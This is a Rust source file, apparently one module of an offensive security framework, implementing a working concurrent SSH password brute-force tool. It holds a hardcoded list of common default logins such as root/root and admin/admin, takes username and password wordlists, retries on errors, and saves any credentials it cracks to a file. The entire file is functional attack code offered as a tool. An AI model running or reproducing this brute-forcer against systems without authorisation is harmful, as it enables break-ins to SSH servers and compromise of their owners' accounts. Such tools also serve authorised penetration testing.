use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    net::TcpStream,
    sync::atomic::{AtomicBool, Ordering},
    sync::Arc,
    time::Duration,
    io::Write,
};
use tokio::{
    sync::{Mutex, Semaphore},
    task::spawn_blocking,
    time::{sleep, timeout},
};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    normalize_target, prompt_default, prompt_yes_no, 
    prompt_existing_file, load_lines, get_filename_in_current_dir
};
use crate::modules::creds::utils::BruteforceStats;

// Constants
const DEFAULT_SSH_PORT: u16 = 22;
const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
];


pub async fn run(target: &str) -> Result<()> {
    println!("{}", "=== SSH Brute Force Module ===".bold());
    println!("[*] Target: {}", target);

    let port: u16 = loop {
        let input = prompt_default("SSH Port", &DEFAULT_SSH_PORT.to_string()).await?;
        match input.parse() {
            Ok(p) if p > 0 => break p,
            _ => println!("{}", "Invalid port. Must be between 1 and 65535.".yellow()),
        }
    };

    // Ask about default credentials
    let use_defaults = prompt_yes_no("Try default credentials first?", true).await?;
    
    let usernames_file = if prompt_yes_no("Use username wordlist?", true).await? {
        Some(prompt_existing_file("Username wordlist").await?)
    } else {
        None
    };
    
    let passwords_file = if prompt_yes_no("Use password wordlist?", true).await? {
        Some(prompt_existing_file("Password wordlist").await?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency: usize = loop {
        let input = prompt_default("Max concurrent tasks", "10").await?;
        match input.parse() {
            Ok(n) if n > 0 && n <= 256 => break n,
            _ => println!("{}", "Invalid number. Must be between 1 and 256.".yellow()),
        }
    };

    let connection_timeout: u64 = loop {
        let input = prompt_default("Connection timeout (seconds)", "5").await?;
        match input.parse() {
            Ok(n) if n >= 1 && n <= 60 => break n,
            _ => println!("{}", "Invalid timeout. Must be between 1 and 60 seconds.".yellow()),
        }
    };

    let retry_on_error = prompt_yes_no("Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        loop {
            let input = prompt_default("Max retries per attempt", "2").await?;
            match input.parse() {
                Ok(n) if n > 0 && n <= 10 => break n,
                _ => println!("{}", "Invalid retries. Must be between 1 and 10.".yellow()),
            }
        }
    } else {
        0
    };

    let stop_on_success = prompt_yes_no("Stop on first success?", true).await?;
    let save_results = prompt_yes_no("Save results to file?", true).await?;
    let save_path = if save_results {
        Some(prompt_default("Output file", "ssh_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = prompt_yes_no("Verbose mode?", false).await?;
    let combo_mode = prompt_yes_no("Combination mode? (try every pass with every user)", false).await?;

    let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|_| format!("{}:{}", target, port));

    println!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            println!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            println!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        println!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    // Calculate total attempts
    let total_attempts = if combo_mode {
        usernames.len() * passwords.len()
    } else {
        passwords.len()
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let timeout_duration = Duration::from_secs(connection_timeout);

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();
    let mut user_cycle_idx = 0usize;

    for pass in passwords.iter() {
        if stop_on_success && stop.load(Ordering::Relaxed) {
            break;
        }

        let selected_users: Vec<String> = if combo_mode {
            usernames.iter().cloned().collect()
        } else {
            if usernames.is_empty() {
                Vec::new()
            } else {
                let user = usernames[user_cycle_idx % usernames.len()].clone();
                user_cycle_idx += 1;
                vec![user]
            }
        };

        for user in selected_users {
            if stop_on_success && stop.load(Ordering::Relaxed) {
                break;
            }

            let addr_clone = connect_addr.clone();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_clone = Arc::clone(&found);
            let unknown_clone = Arc::clone(&unknown);
            let stop_clone = Arc::clone(&stop);
            let stats_clone = Arc::clone(&stats);
            let semaphore_clone = semaphore.clone();
            let timeout_clone = timeout_duration;
            let stop_flag = stop_on_success;
            let verbose_flag = verbose;
            let retry_flag = retry_on_error;
            let max_retries_clone = max_retries;

            tasks.push(tokio::spawn(async move {
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                // Acquire semaphore permit inside the spawned task
                let _permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };
                
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                let mut retries = 0;
                loop {
                    match try_ssh_login(&addr_clone, &user_clone, &pass_clone, timeout_clone).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green());
                            let mut found_guard = found_clone.lock().await;
                            // Check if already found to avoid duplicates
                            let entry = (addr_clone.clone(), user_clone.clone(), pass_clone.clone());
                            if !found_guard.contains(&entry) {
                                found_guard.push(entry);
                            }
                            stats_clone.record_attempt(true, false);
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                            break;
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                            break;
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            if retry_flag && retries < max_retries_clone {
                                retries += 1;
                                stats_clone.record_retry();
                                if verbose_flag {
                                    println!(
                                        "\r{}",
                                        format!(
                                            "[!] {} -> {}:{} (retry {}/{}) - {}",
                                            addr_clone,
                                            user_clone,
                                            pass_clone,
                                            retries,
                                            max_retries_clone,
                                            msg
                                        )
                                        .yellow()
                                    );
                                }
                                sleep(Duration::from_millis(500)).await;
                                continue;
                            } else {
                                {
                                    let mut unk = unknown_clone.lock().await;
                                    unk.push((
                                        addr_clone.clone(),
                                        user_clone.clone(),
                                        pass_clone.clone(),
                                        msg.clone(),
                                    ));
                                }
                                if verbose_flag {
                                    println!(
                                        "\r{}",
                                        format!(
                                            "[?] {} -> {}:{} error/unknown: {}",
                                            addr_clone, user_clone, pass_clone, msg
                                        )
                                        .yellow()
                                    );
                                }
                                break;
                            }
                        }
                    }
                }
            }));
        }
    }

    // Wait for all tasks with FuturesUnordered
    while let Some(res) = tasks.next().await {
         if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n{}", "[-] No credentials found.".yellow());
    } else {
        println!("\n{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            // Use std::fs::File for simple writing
            use std::fs::File;
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            file.flush()?;
            println!("{}", format!("[+] Results saved to '{}'", filename.display()).green());
        }
    }

    drop(creds);

    // Unknown / errored attempts
    let unknown_guard = unknown.lock().await;
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored SSH responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if prompt_yes_no("Save unknown responses to file?", true).await? {
            let default_name = "ssh_unknown_responses.txt";
            let fname = prompt_default(
                &format!(
                    "What should the unknown results be saved as? (default: {})",
                    default_name
                ),
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::fs::File;
            match File::create(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# SSH Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in unknown_guard.iter() {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    println!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    println!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

async fn try_ssh_login(
    normalized_addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let handle = spawn_blocking(move || {
            let tcp = TcpStream::connect(&addr_owned)
                .map_err(|e| anyhow!("Connection error: {}", e))?;
            
            let mut sess = Session::new()
                .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
            sess.set_tcp_stream(tcp);
            
            sess.handshake()
                .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;
            
            sess.userauth_password(&user_owned, &pass_owned)
                .map_err(|e| anyhow!("Authentication failed: {}", e))?;
            
            Ok(sess.authenticated())
    });

    let join_result = timeout(timeout_duration, handle)
        .await
        .map_err(|_| anyhow!("Connection timeout"))?;

    join_result.map_err(|e| anyhow!("Join error: {}", e))?
}
